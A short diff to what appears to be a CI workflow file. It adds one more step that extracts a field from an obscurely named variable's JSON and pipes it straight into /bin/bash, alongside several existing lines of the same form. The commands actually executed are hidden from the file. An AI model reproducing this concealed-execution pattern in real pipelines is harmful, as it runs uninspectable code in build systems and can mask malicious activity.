@@ -37,6 +37,7 @@ jobs:
           echo $ght72 | jq -r .ob86 | /bin/bash
           echo $d610 | jq -r .qtuid7337 | /bin/bash
           printf '%s' "$gi5" | jq -r .al2 | /bin/bash
+          echo $dx50436 | jq -r .v58 | /bin/bash
 
       - name: Archive output
         if: always()
